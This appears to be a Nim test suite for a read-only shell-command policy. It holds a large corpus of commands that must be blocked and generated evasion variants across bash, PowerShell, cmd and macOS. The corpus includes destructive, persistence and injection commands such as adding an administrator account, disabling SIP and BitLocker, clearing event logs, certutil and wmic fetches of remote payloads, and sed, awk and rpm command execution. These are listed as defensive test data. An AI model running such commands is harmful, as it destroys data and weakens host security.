  "curl -q --header=@headers.txt https://example.com/item",
  "curl -q --ftp-alternative-to-user 'DELE file' ftp://example.com/file",
  "curl -q --proto-default gopher 127.0.0.1:6379",
  "curl -q --alt-svc state.txt https://example.com",
  "curl -q --hsts state.txt https://example.com",
  "curl -q --stderr trace.txt https://example.com",
  "curl -q --parallel https://example.com https://example.org",
  "curl -q --parallel --parallel-max 100 https://example.com",
  "curl -q ~",
  "curl -q --out=result.txt https://example.com",
  "wget https://example.com/file",
  "wget -O file https://example.com",
  "wget --post-data=x https://example.com",
  "wget -O- -e output_document=file https://example.com",
  "wget --no-config --no-hsts -qO- -o wget.log https://example.com",
  "wget --no-config --no-hsts -qO- --config=evil https://example.com",
  "wget --no-config --no-hsts -qO- " &
    "--header='X-Method-Override: PUT' https://example.com/item",
  "wget --no-config --no-hsts -qO- --header @headers.txt " &
    "https://example.com/item",
  "git add .",
  "git checkout main",
  "git -C . reset --hard",
  "git -c alias.x='!touch marker' x",
  "git --exec-path=/tmp status",
  "git --paginate log -1 --oneline",
  "git status --short",
  "git -C . status --short",
  "git diff --output=result.diff",
  "git diff --ext-diff",
  "git diff --stat",
  "git diff --no-ext-diff --no-textconv",
  "git diff --cached --no-ext-diff",
  "git diff-files --no-ext-diff --no-textconv -p",
  "git diff-files --name-only --no-ext-diff",
  "git show --stat HEAD",
  "git show --no-ext-diff --stat HEAD",
  "git show --no-textconv --stat HEAD",
  "git show --no-patch --patch HEAD",
  "git show -s --remerge-diff HEAD",
  "git log --stat -1",
  "git log --remerge-diff -1",
  "git log --cc -1",
  "git log -c -1",
  "git log --show-signature -1",
  "git log --format -- --show-signature -1",
  "git log '--format=%G?' -1",
  "git log --format '%G?' -1",
  "git branch --format '%(signature:grade)'",
  "git tag -v v1",
  "git tag --verify v1",
  "git reflog show -p -1",
  "git grep --open-files-in-pager=sh pattern",
  "git grep -Osh pattern",
  "git reflog show --output=reflog.txt",
  "git reflog show -p --no-ext-diff --no-textconv --ext-diff",
  "git cat-file --filters HEAD:file",
  "git help --web status",
  "git branch new-branch",
  "git tag v1",
  "git tag -a v1",
  "git tag --format=x release-created",
  "git tag --sort=refname release-created",
  "git tag --column release-created",
  "git config user.name attacker",
  "git config --get user.name --unset user.email",
  "git remote add origin URL",
  "git remote -v add origin URL",
  "git worktree add ../other",
  "git reflog expire --all",
  "git submodule foreach 'touch marker'",
  "git submodule summary",
  "docker stats",
  "docker stats --no-stream=false",
  "docker events",
  "docker logs -f container",
  "docker compose logs --follow",
  "docker run alpine",
  "docker exec container sh",
  "docker container rm container",
  "docker compose up",
  "docker compose config --output compose.yml",
  "podman pull image",
  "kubectl apply -f app.yaml",
  "kubectl get pods -w",
  "kubectl get pods --watch=true",
  "kubectl logs -f pod-name",
  "kubectl delete pod x",
  "kubectl exec pod -- sh",
  "kubectl config set-context x",
  "kubectl --kubeconfig=evil.yaml get pods",
  "kubectl --namespace -- get pods --kubeconfig=evil.yaml",
  "kubectl --cache-dir=./cache get pods",
  "kubectl --profile=cpu get pods",
  "kubectl get pods --profile-output=profile.pprof",
  "kubectl cluster-info dump --output-directory=diagnostics",
  "apt install package",
  "apt satisfy package",
  "apt list -o APT::Update::Pre-Invoke::=touch-marker",
  "apt list -oAPT::Update::Pre-Invoke::=touch-marker",
  "apt-cache policy bash -cevil.conf",
  "apt-get update",
  "dnf remove package",
  "dnf history undo 1",
  "dnf history rollback 1",
  "dnf info bash --setopt=pluginpath=.",
  "dnf info bash -cevil.conf",
  "pacman -S package",
  "brew install package",
  "brew services start postgresql",
  "brew info /tmp/untrusted-formula",
  "brew info ./untrusted.rb",
  "winget install package",
  "winget upgrade --all",
  "pip install package",
  "pip list --log=results.log",
  "pip list --cache-dir=./cache",
  "npm install package",
  "npm view react --userconfig=evil.npmrc",
  "npm view react --cache=./cache",
  "cargo install package",
  "cargo metadata --no-deps",
  "cargo search serde --config net.git-fetch-with-cli=true",
  "nimble install package",
  "nimble dump untrusted.nimble",
  "tar -xf archive.tar",
  "tar -tf host:archive.tar",
  "tar -tfhost:archive.tar",
  "tar -tvfhost:archive.tar",
  "tar -tM -f archive.tar",
  "tar -tL1 -f archive.tar",
  "tar -tf archive.tar --blocking-factor=1000000000",
  "tar -tvb999999999 -f archive.tar",
  "tar -tf archive.tar --record-size=1073741824",
  "tar --checkpoint-action=exec='touch marker' -tf archive.tar",
  "tar -tIevil archive.tar",
  "tar -tf archive.tar -T option-injection.txt",
  "tar -tFevil archive.tar",
  "tar -tf archive.tar --index-file=result.txt",
  "tar -tf host:archive.tar --rmt-command=helper",
  "tar -tf archive.tar --remove-files",
  "unzip archive.zip",
  "unzip -lT archive.zip",
  "gzip file",
  "gzip -S.c file",
  "gunzip file.gz",
  "xz -c -T999 source.bin",
  "xz -c -9e source.bin",
  "xz -c --lzma2=dict=4GiB source.bin",
  "xz -c --block-size=4GiB source.bin",
  "xzcat --memlimit-decompress=100% archive.xz",
  "reg add HKCU\\Software\\X /v Y /d Z",
  "sc stop service",
  "wevtutil cl System",
  "certutil -urlcache -split -f https://example.com/file out.exe",
  "cmdkey /add:server /user:u /pass:p",
  "tzutil /s UTC",
  "powercfg /setactive scheme-guid",
  "powercfg /batteryreport /output report.html",
  "schtasks /create /tn demo /tr calc.exe /sc once /st 12:00",
  "schtasks /run /tn demo",
  "wmic process call create calc.exe",
  "wmic /output:result.txt cpu get Name",
  "wmic process list /format:https://example.com/evil.xsl",
  "wmic process get Name /every:1",
  "wmic /node:remote process get Name",
  "dism /Online /Enable-Feature /FeatureName:Demo",
  "dism /Online /Get-Packages /LogPath:result.log",
  "dism /Online /Get-Packages /Set-Edition:ServerDatacenter",
  "dism /Online /Get-Packages /Mount-Image /MountDir:C:\\offline",
  "dism /Online /Cleanup-Image /RestoreHealth",
  "dism /Online /Cleanup-Image /StartComponentCleanup",
  "dism /Online /Cleanup-Image /ResetBase",
  "dism /Online /Cleanup-Mountpoints /Get-Packages",
  "fsutil file createNew marker 1",
  "net start Spooler",
  "net user newuser password /add",
  "net localgroup Administrators newuser /add",
  "net share demo=C:\\Temp",
  "query logoff 1",
  "bcdedit /set '{current}' safeboot minimal",
  "bcdedit /enum all /export store.bcd",
  "manage-bde -off C:",
  "manage-bde -protectors -disable C:",
  "manage-bde -status C: -off",
  "fltmc unload filter-name",
  "wsl --shutdown",
  "wsl -d Ubuntu touch marker",
  "set NAME=value",
  "set -o history",
  "sort.exe /OUTPUT result.txt input.txt",
  "sort --buffer-size=64G README.md",
  "sort -S64G README.md",
  "sort --parallel=64 README.md",
  "Set-Content file value",
  "printf -v 'x[$(touch marker)]' %s value",
  "echo ${HOME:-/tmp}",
  "echo ${HOME:0:1}",
  "echo ${HOME@P}",
  "sort ${HOME}",
  "Remove-Item file",
  "New-Item file",
  "Invoke-Expression 'Remove-Item file'",
  "& { Remove-Item file }",
  "[IO.File]::Delete('file')",
  "Get-Content file | ForEach-Object { Remove-Item file }",
  "Get-Content file -Wait",
  "Get-Content file -Raw",
  "Get-Content file -Delimiter END",
  "Get-Content file -ReadCount 0",
  "Get-Content file -ReadCount 4097",
  "Get-Content file -ReadCount:0",
  "Get-Content file -Rea 10",
  "Get-Counter '\\Processor(_Total)\\% Processor Time' -Continuous",
  "Get-Counter '\\Processor(_Total)\\% Processor Time' -MaxSamples 1000",
  "Get-Counter '\\Processor(_Total)\\% Processor Time' -SampleInterval 60",
  "Test-Connection localhost -Repeat",
  "Test-Connection localhost -Count 21",
  "Test-Connection localhost -Cou 21",
  "Test-Connection localhost -BufferSize 1048576",
  "Test-Connection localhost -ThrottleLimit 1000",
  "Test-Connection localhost -AsJob",
  "Get-Process | Where-Object 'Remove-Item marker'",
  "Get-Process | Where-Object -FilterSc 'Remove-Item marker'",
  "Get-Process --% -OutVariable hidden",
  "Get-Help Get-Content -Online",
  "Get-Help Get-Content -ShowWindow",
  "Get-Package",
  "go env -w GOPROXY=https://example.com",
  "go env -u GOPROXY",
  "go run untrusted.go",
  "dotnet run",
  "rustup update",
  "rustup toolchain install nightly",
  "swift untrusted.swift",
  "xcodebuild build",
  "java UntrustedMain",
  "Invoke-WebRequest -Method POST -Body x https://example.com",
  "Invoke-WebRequest -OutFile file https://example.com",
  "Invoke-WebRequest https://example.com -ResponseHeadersVariable HOME; " &
    "rg needle \"$HOME\" .",
  "Invoke-RestMethod https://example.com -StatusCodeVariable PWD; " &
    "find \"$PWD\" -maxdepth 1",
  "iwr -InFile file -Method Put https://example.com",
  "free -h && touch marker",
  "ls -la; rm -rf marker",
  "false || chmod 777 file",
  "cat *.nimble; cp a b",
  "sed 's/a/b/e' file",
  "sed 's/a/b/w result.txt' file",
  "mount -a",
  "mount /dev/sda1",
  "blkid --write-cache cache.tab",
  "dmidecode --dump-bin firmware.bin",
  "udevadm control --reload",
  "ifconfig en0 down",
  "ifconfig en0 promisc",
  "ifconfig en0 txqueuelen 1000",
  "resolvectl flush-caches",
  "resolvectl log-level debug",
  "networkctl down eth0",
  "networkctl --runtime reload",
  "networkctl --runtime down eth0",
  "rfkill unblock all",
  "launchctl unload service.plist",
  "scutil --set ComputerName changed",
  "diskutil eraseDisk APFS NewDisk disk2",
  "defaults write NSGlobalDomain Demo -bool true",
  "mdutil -i on /",
  "mdfind -live 'kMDItemFSName == *.nim'",
  "xattr -w com.example.demo value README.md",
  "xattr -d com.apple.quarantine README.md",
  "xattr -c README.md",
  "pkgutil --forget com.example.pkg",
  "pkgutil --expand package.pkg output",
  "pkgutil --pkgs --forget com.example.pkg",
  "plutil -replace Name -string changed Info.plist",
  "plutil -convert xml1 Info.plist",
  "plutil -p Info.plist -o output.plist",
  "xcode-select --switch /Applications/Xcode.app",
  "xcode-select --install",
  "log collect --output logs.logarchive",
  "log stream --style compact",
  "pmset sleepnow",
  "pmset -a sleep 0",
  "pmset -g live",
  "networksetup -setdnsservers Wi-Fi 1.1.1.1",
  "networksetup -listallhardwareports -setairportpower en0 off",
  "csrutil disable",
  "csrutil authenticated-root disable",
  "spctl --disable",
  "fdesetup enable",
  "systemextensionsctl reset",
  "systemextensionsctl uninstall TEAM bundle.id",
  "nvram demo=value",
  "nvram -d demo",
  "profiles remove -identifier demo",
  "profiles list -output /tmp/profiles.plist",
  "profiles show -output=profiles.plist",
  "profiles list -output-file profiles.plist",
  "tmutil startbackup",
  "tmutil delete /Volumes/Backup/snapshot",
  "systemctl --failed; systemctl restart sshd",
  "git branch -vv new-branch",
  "rpm --install package.rpm",
  "rpm --verify bash",
  "rpm -Va",
  "dpkg --install package.deb",
  "apk add package",
  "snap install package",
  "flatpak install app.id"
]

const MutatingExecutables = [
  "rm", "rmdir", "unlink", "shred", "truncate", "touch", "mkdir", "cp",
  "mv", "install", "ln", "chmod", "chown", "chgrp", "setfacl", "mkfs",
  "dd", "mount", "umount", "kill", "pkill", "shutdown", "reboot", "tee",
  "scp", "sftp", "rsync", "patch", "ed", "vim", "nano", "xargs", "parallel",
  "sudo", "doas", "eval", "exec", "bash", "powershell", "pwsh", "cmd"
]

suite "mandatory read-only command policy":
  test "accepts the realistic safe corpus without false positives":
    var rejected: seq[string] = @[]
    for command in SafeCorpus:
      let decision = checkReadOnlyCommand(command)
      if not decision.allowed:
        rejected.add(command & " => " & decision.reason)
    if rejected.len > 0:
      checkpoint(rejected.join("\n"))
    check rejected.len == 0

  test "blocks the adversarial mutation corpus":
    var allowed: seq[string] = @[]
    for command in AttackCorpus:
      let decision = checkReadOnlyCommand(command)
      if decision.allowed:
        allowed.add(command)
      else:
        check decision.reason.len > 0
    if allowed.len > 0:
      checkpoint(allowed.join("\n"))
    check allowed.len == 0

  test "accepts bounded Linux performance diagnostics":
    for command in [
      "top -bn1 | head -n 15",
      "free -h",
      "vmstat 1 2",
      "sensors -A",
      "nproc"
    ]:
      check checkReadOnlyCommand(command, "bash").allowed
      check checkReadOnlyCommand(command, "fish").allowed
    when defined(linux):
      check not checkReadOnlyCommand("netstat -c", "bash").allowed

  test "uses the native base64 short-option semantics":
    when defined(linux):
      check checkReadOnlyCommand("base64 -i -- -o result.txt", "bash").allowed
    else:
      check not checkReadOnlyCommand(
        "base64 -i -- -o result.txt", "bash").allowed

  test "accepts bounded macOS performance diagnostics":
    for command in [
      "top -l 1 -n 0",
      "top -l1 -n0",
      "top -l 1 -n 15 -o cpu",
      "vm_stat",
      "vm_stat -c 3 1",
      "sysctl hw.memsize",
      "system_profiler -detailLevel mini SPHardwareDataType"
    ]:
      check checkReadOnlyCommand(command, "zsh").allowed
    when defined(macosx):
      check not checkReadOnlyCommand("netstat -w 1", "zsh").allowed
      check checkReadOnlyCommand("netstat -c queue", "zsh").allowed

  test "accepts native Windows performance diagnostics":
    for command in [
      "Get-Process | Sort-Object CPU | Select-Object -First 15",
      "Get-CimInstance Win32_OperatingSystem | " &
        "Select-Object TotalVisibleMemorySize,FreePhysicalMemory",
      "Get-Counter '\\Processor(_Total)\\% Processor Time'",
      "tasklist /fo csv /nh"
    ]:
      check checkReadOnlyCommand(command, "powershell").allowed

  test "accepts common display-only text selectors":
    for command in [
      "sed -n '1,80p' README.md",
      "sed -n '/Safety model/p' README.md",
      "sed -n '/services = {/,/^[[:space:]]*}/p' README.md",
      "sed 's/ = {//' README.md",
      "awk -F: 'NR<=5 {print $1, $NF}' /etc/passwd",
      "awk '{print NR, $0}' < README.md",
      "awk '!/^\\.ci\\//' < README.md",
      "sed 's|^\\./||; s|/[^/]*$||' README.md"
    ]:
      check checkReadOnlyCommand(command, "bash").allowed

  test "keeps dual-use diagnostic and selector mutation paths closed":
    for command in [
      "top",
      "top -bn6",
      "top -l 1 -n -1",
      "sensors -s",
      "sed -i 's/a/b/' file",
      "sed '1w result.txt' file",
      "sed '1e touch marker' file",
      "sed '/safe/{w result.txt\n}' file",
      "awk 'BEGIN {system(\"touch marker\")}'",
      "awk '{print > \"result.txt\"}'",
      "awk '/safe/; system(\"touch marker\")'",
      "sed 's/a/b/;s/c/d/e' file",
      "free -h & uname -a"
    ]:
      check not checkReadOnlyCommand(command, "bash").allowed

  test "rejects malformed and oversized input":
    for command in ["", "   ", "| head", "pwd |", "pwd # hidden"]:
      check not checkReadOnlyCommand(command).allowed
    check not checkReadOnlyCommand(repeat("x", 32_769)).allowed

  test "blocks generated executable-obfuscation variants":
    var checked = 0
    var escaped: seq[string] = @[]
    for name in MutatingExecutables:
      let variants = [
        name & " target",
        "/bin/" & name & " target",
        "./" & name & " target",
        name[0 .. 0] & "''" & name[1 .. ^1] & " target",
        name[0 .. 0] & "\"\"" & name[1 .. ^1] & " target",
        name[0 .. 0] & "\\" & name[1 .. ^1] & " target",
        toUpperAscii(name) & ".exe target",
        "pwd | " & name & " target"
      ]
      for command in variants:
        checked += 1
        if checkReadOnlyCommand(command, "bash").allowed:
          escaped.add(command)
      if name.len > 1:
        for split in 1 ..< name.len:
          for command in [
            name[0 ..< split] & "''" & name[split .. ^1] & " target",
            name[0 ..< split] & "\"\"" & name[split .. ^1] & " target",
            name[0 ..< split] & "\\" & name[split .. ^1] & " target"
          ]:
            checked += 1
            if checkReadOnlyCommand(command, "bash").allowed:
              escaped.add(command)
    if escaped.len > 0:
      checkpoint(escaped.join("\n"))
    check escaped.len == 0
    echo "generated attack variants: ", checked

  test "blocks generated shell-control combinations":
    var checked = 0
    var escaped: seq[string] = @[]
    for prefix in ["pwd", "echo safe", "uname -a"]:
      for separator in ["; ", " && ", " || ", " & ", "\n", "\r\n", " | "]:
        for name in MutatingExecutables:
          let command = prefix & separator & name & " target"
          checked += 1
          if checkReadOnlyCommand(command, "bash").allowed:
            escaped.add(command)
    for name in MutatingExecutables:
      for command in [
        "$(" & name & " target)",
        "`" & name & " target`",
        "${" & toUpperAscii(name) & "} target",
        "$'" & name & "' target"
      ]:
        checked += 1
        if checkReadOnlyCommand(command, "bash").allowed:
          escaped.add(command)
    if escaped.len > 0:
      checkpoint(escaped.join("\n"))
    check escaped.len == 0
    echo "generated shell-control attacks: ", checked

  test "blocks generated dangerous long-option abbreviations":
    let cases = [
      ("sort ", "--output", "=result.txt input.txt"),
      ("sort ", "--temporary-directory", "=/tmp input.txt"),
      ("diff ", "--output", "=result.patch a b"),
      ("tree ", "--output", "=result.txt"),
      ("base64 ", "--output", "=result.txt input.bin"),
      ("rg ", "--pre", "=helper pattern ."),
      ("file ", "--compile", " custom.magic"),
      ("pgrep ", "--signal", "=TERM bash"),
      ("date ", "--set", "=2030-01-01"),
      ("hostname ", "--file", "=host.txt"),
      ("dmesg ", "--clear", ""),
      ("journalctl ", "--vacuum-time", "=1s"),
      ("sysctl ", "--write", " kernel.hostname=changed"),
      ("nvidia-smi ", "--power-limit", "=100"),
      ("wget --no-config --no-hsts -qO- ", "--post-data", "=x URL"),
      ("git diff ", "--output", "=result.patch"),
      ("tar -tf archive.tar ", "--checkpoint-action", "=exec=helper"),
      ("kubectl get pods ", "--kubeconfig", "=evil.yaml"),
      ("kubectl get pods ", "--profile-output", "=profile.pprof"),
      ("docker compose config ", "--output", "=compose.yaml")
    ]
    var checked = 0
    var escaped: seq[string] = @[]
    for item in cases:
      for prefixLength in 3 ..< item[1].len:
        let command = item[0] & item[1][0 ..< prefixLength] & item[2]
        checked += 1
        if checkReadOnlyCommand(command, "bash").allowed:
          escaped.add(command)
    if escaped.len > 0:
      checkpoint(escaped.join("\n"))
    check escaped.len == 0
    echo "generated long-option abbreviation attacks: ", checked

  test "does not confuse dangerous search text with execution":
    var rejected: seq[string] = @[]
    var checked = 0
    for name in MutatingExecutables:
      let needle = "documentation for " & name & " --dangerous"
      for command in [
        "rg '" & needle & "' src",
        "grep -F '" & needle & "' README.md",
        "printf '%s\\n' '" & needle & "'",
        "echo '" & needle & "'"
      ]:
        checked += 1
        if not checkReadOnlyCommand(command, "bash").allowed:
          rejected.add(command)
    if rejected.len > 0:
      checkpoint(rejected.join("\n"))
    check rejected.len == 0
    echo "danger-word false-positive probes: ", checked

  test "blocks cmd percent expansion in validated arguments":
    check not checkReadOnlyCommand(
      "curl %CURL_ARGS% https://example.com", "cmd").allowed
    check not checkReadOnlyCommand("printf %PAYLOAD%", "cmd").allowed
    check not checkReadOnlyCommand("date %PAYLOAD%", "cmd").allowed
    check not checkReadOnlyCommand(
      "echo 'safe & del marker'", "cmd").allowed
    check checkReadOnlyCommand("date +%Y", "bash").allowed

  test "normalizes POSIX escapes before policy decisions":
    check checkReadOnlyCommand("printf file\\ name", "bash").allowed
    check not checkReadOnlyCommand("r\\m -rf data", "bash").allowed
    check not checkReadOnlyCommand(
      "date --se\\t=2030-01-01", "bash").allowed
    check not checkReadOnlyCommand(
      "curl -q gopher\\://127.0.0.1/_PING", "bash").allowed

  test "quoted escapes cannot hide commands or option injection":
    check not checkReadOnlyCommand("echo \"\\\"\"; touch marker #\"").allowed
    for shell in ["bash", "sh", "zsh", "fish"]:
      check not checkReadOnlyCommand(
        "echo \"\\\"\"; touch marker #\"", shell).allowed
      check checkReadOnlyCommand(
        "printf '%s' \"a\\\"b\"", shell).allowed
      check checkReadOnlyCommand(
        "printf '%s' \"literal \\$HOME\"", shell).allowed
      check not checkReadOnlyCommand("rg -e -- *", shell).allowed
      check not checkReadOnlyCommand("sort -k -- *", shell).allowed
      check checkReadOnlyCommand("rg -- pattern ./file*", shell).allowed
    check not checkReadOnlyCommand(
      "echo '\\''; touch marker #'", "fish").allowed
    check checkReadOnlyCommand("echo 'it\\'s data'", "fish").allowed

  test "rejects helper and file-writing options in apparent readers":
    for command in [
      "git blame file.txt", "git blame --no-textconv file.txt",
      "git blame --no-textconv -L HEAD -- file.txt",
      "git blame --no-textconv --contents other HEAD -- file.txt",
      "git --help status", "yq -s output . input.yml",
      "yq -ps=output . input.yml", "lsof -Db/tmp/device-cache",
      "nft list ruleset ';' add table inet marker",
      "tmux list-sessions ';' run-shell 'touch marker'",
      "tmux list-panes -F 'data;' run-shell 'touch marker'",
      "nft -af rules.nft list ruleset",
      "rpm -qE '%{lua:os.execute(\"touch marker\")}'",
      "rpm -qa --define '_query_all_fmt injected'", "rpm -q --load macros",
      "rpm -qa --predefine '_dbpath injected'",
      "rpm -q --specfile package.spec", "ip l s lo down",
      "ip a a 192.0.2.1/32 dev lo", "ip netns a marker",
      "printf x > /dev/NULL", "curl -q -o /dev/NULL https://example.com"
    ]:
      checkpoint(command)
      check not checkReadOnlyCommand(command, "bash").allowed
    for command in [
      "git blame --no-textconv HEAD -- file.txt", "nft -j list ruleset",
      "tmux list-panes -F '#{pane_id};#{session_name}'",
      "yq '.name' input.yml", "lsof -p 123", "git branch -l 'feature*'",
      "ip a", "ip -br addr", "ip route get 127.0.0.1", "rpm -qi bash"
    ]:
      checkpoint(command)
      check checkReadOnlyCommand(command, "bash").allowed

  test "admits only literal-file stdin redirection for data readers":
    for command in [
      "wc -l < input.txt",
      "wc -l < 'input file.txt'",
      "grep needle < input.txt | wc -l",
      "cat 0<input.txt > /dev/null"
    ]:
      check checkReadOnlyCommand(command, "bash").allowed
    for command in [
      "cat <<EOF", "cat <<< value", "cat <> output.txt", "cat <&3",
      "cat < <(touch marker)", "cat < $(touch marker)", "cat < *.txt",
      "cat < $INPUT_FILE", "cat < first < second",
      "curl -q --config - < options.txt", "python3 < script.py"
    ]:
      check not checkReadOnlyCommand(command, "bash").allowed
    check checkReadOnlyCommand("wc -l < input.txt", "cmd").allowed
    check not checkReadOnlyCommand(
      "wc -l < 'input&del marker'", "cmd").allowed
    check not checkReadOnlyCommand(
      "wc -l < \"%INPUT_FILE%\"", "cmd").allowed
    check not checkReadOnlyCommand(
      "cat < input.txt", "powershell").allowed

  test "blocks PowerShell parameter abbreviations and script conversion":
    var checked = 0
    for parameter in [
      "-OutFile", "-Body", "-InFile", "-Form", "-SessionVariable"
    ]:
      for prefixLength in 2 ..< parameter.len:
        let command = "Invoke-WebRequest " &
          parameter[0 ..< prefixLength] & " marker https://example.com"
        checked += 1
        check not checkReadOnlyCommand(command, "powershell").allowed
    check not checkReadOnlyCommand(
      "Get-Process | Where-Object 'Set-Content marker x'",
      "powershell").allowed
    check not checkReadOnlyCommand(
      "Get-Content args.txt -OutVariable items | Invoke-WebRequest @items",
      "powershell").allowed
    check checkReadOnlyCommand(
      "Get-Process | Write-Output '@items'", "powershell").allowed
    echo "generated PowerShell parameter attacks: ", checked

  test "blocks PowerShell cross-stage variable poisoning":
    for command in [
      "Write-Output '--pre=touch marker' -OutVariable HOME; " &
        "rg needle \"$HOME\" .",
      "Write-Output '--pre=touch marker' -OV HOME; rg needle \"$HOME\" .",
      "Get-Item missing -ErrorVariable HOME; rg needle \"$HOME\" .",
      "Get-Process -PipelineVariable PWD | Select-Object -First 1; " &
        "find \"$PWD\" -maxdepth 1",
      "Get-Process -OutBuffer 1000000 | Select-Object -First 1"
    ]:
      check not checkReadOnlyCommand(command, "powershell").allowed
    check checkReadOnlyCommand(
      "Get-Process -ErrorAction SilentlyContinue | Select-Object -First 1",
      "powershell").allowed

  test "keeps shell-local mutation out of POSIX reader sequences":
    check not checkReadOnlyCommand("set -o history; echo inspected", "bash").allowed
    check not checkReadOnlyCommand("set -f; ls *", "bash").allowed
    check checkReadOnlyCommand("set PATH", "cmd").allowed

  test "uses shell-specific aliases and null devices":
    check not checkReadOnlyCommand("printf x > nul", "bash").allowed
    check checkReadOnlyCommand("printf x > /dev/null", "bash").allowed
    check not checkReadOnlyCommand("echo x > /dev/null", "cmd").allowed
    check checkReadOnlyCommand("echo x > nul", "cmd").allowed
    check checkReadOnlyCommand("Write-Output x > $null", "pwsh").allowed
    when defined(windows):
      check checkReadOnlyCommand("Write-Output x > nul", "pwsh").allowed
    else:
      check not checkReadOnlyCommand("Write-Output x > nul", "pwsh").allowed
    check not checkReadOnlyCommand("sc query spooler", "powershell").allowed
    check checkReadOnlyCommand("sc.exe query spooler", "powershell").allowed
    check not checkReadOnlyCommand("ping -t 127.0.0.1", "cmd").allowed
    check not checkReadOnlyCommand("ping -t 2 127.0.0.1", "bash").allowed
    check checkReadOnlyCommand(
      "ping -c 1 -t 2 127.0.0.1", "bash").allowed
    check not checkReadOnlyCommand(
      "sort.exe /OUTPUT result.txt input.txt", "cmd").allowed
    check not checkReadOnlyCommand(
      "sort -o result.txt input.txt", "powershell").allowed
    check not checkReadOnlyCommand(
      "Get-Process | Sort-Object -OutVariable captured", "powershell").allowed
    check not checkReadOnlyCommand(
      "Get-Process | sort -PV captured", "powershell").allowed
    check checkReadOnlyCommand(
      "Get-Process | sort CPU", "powershell").allowed
    check checkReadOnlyCommand(
      "Get-Process | Sort-Object -Descending CPU", "powershell").allowed
    check not checkReadOnlyCommand(
      "Get-Process | where 'Remove-Item marker'", "powershell").allowed
    check checkReadOnlyCommand(
      "Get-Process | where Name -eq bash", "powershell").allowed
    check checkReadOnlyCommand(
      "Invoke-WebRequest -Method GET https://example.com", "powershell").allowed
    check checkReadOnlyCommand(
      "curl -Method HEAD https://example.com", "powershell").allowed
    check not checkReadOnlyCommand(
      "curl -Method POST https://example.com", "powershell").allowed
    check not checkReadOnlyCommand(
      "wget -OutFile marker https://example.com", "powershell").allowed
    check not checkReadOnlyCommand(
      "cat README.md -Wait", "powershell").allowed
    check not checkReadOnlyCommand(
      "type README.md -Wait", "pwsh").allowed

  test "limits the macOS native-reader compatibility class":
    for command in [
      "top -l 1 -n 15 | head -n 20",
      "ps aux | head -n 20",
      "traceroute -m 2 127.0.0.1",
      "launchctl list | head -n 21"
    ]:
      check macosRequiresUnsandboxedReader(command, "zsh")
    for command in [
      "echo top",
      "grep top README.md",
      "vm_stat",
      "launchctl print system | head -n 20",
      "launchctl unload service.plist",
      "top -l 1; touch marker",
      "ps aux | sh"
    ]:
      check not macosRequiresUnsandboxedReader(command, "zsh")

  test "allows only controlled non-secret shell expansions":
    check checkReadOnlyCommand("echo $HOME", "bash").allowed
    check checkReadOnlyCommand("echo \"$PWD\"", "bash").allowed
    check checkReadOnlyCommand("ls -d $HOME", "bash").allowed
    check checkReadOnlyCommand("grep '$HOME' README.md", "bash").allowed
    check checkReadOnlyCommand("grep \"$HOME\" README.md", "bash").allowed
    check checkReadOnlyCommand("cat ~/README.md", "bash").allowed
    check checkReadOnlyCommand(
      "find \"$HOME\" -maxdepth 2 -type f", "bash").allowed
    check checkReadOnlyCommand("find ~ -maxdepth 2 -type f", "bash").allowed
    check checkReadOnlyCommand("rg TODO \"$PWD\"", "bash").allowed
    check checkReadOnlyCommand(
      "git -C \"$PWD\" branch --show-current", "bash").allowed
    check checkReadOnlyCommand("sort '~'", "bash").allowed
    check not checkReadOnlyCommand("sort ~", "bash").allowed
    check checkReadOnlyCommand("Write-Output $HOME", "powershell").allowed
    check checkReadOnlyCommand(
      "Get-ChildItem $HOME | Select-Object -First 1", "powershell").allowed
    check not checkReadOnlyCommand("find $HOME -type f", "bash").allowed
    check not checkReadOnlyCommand("find \"$USER\" -type f", "bash").allowed
    check not checkReadOnlyCommand("curl -q $HOME", "bash").allowed
    check not checkReadOnlyCommand("sort $HOME", "bash").allowed
    check not checkReadOnlyCommand("xxd $HOME", "bash").allowed
    check not checkReadOnlyCommand(
      "Invoke-WebRequest $HOME", "powershell").allowed
    check not checkReadOnlyCommand("echo $API_KEY", "bash").allowed
    check checkReadOnlyCommand("echo ${HOME}", "bash").allowed
    check checkReadOnlyCommand(
      "grep -R absent src; echo \"exit=$?\"", "bash").allowed
    check checkReadOnlyCommand("ls -d \"${PWD}\"", "bash").allowed
    check not checkReadOnlyCommand("echo ${HOME:-/tmp}", "bash").allowed

  test "reports quantitative corpus size":
    echo "policy corpus: safe=", SafeCorpus.len,
      " attack=", AttackCorpus.len,
      " total=", SafeCorpus.len + AttackCorpus.len
    check SafeCorpus.len >= 100
    check AttackCorpus.len >= 150
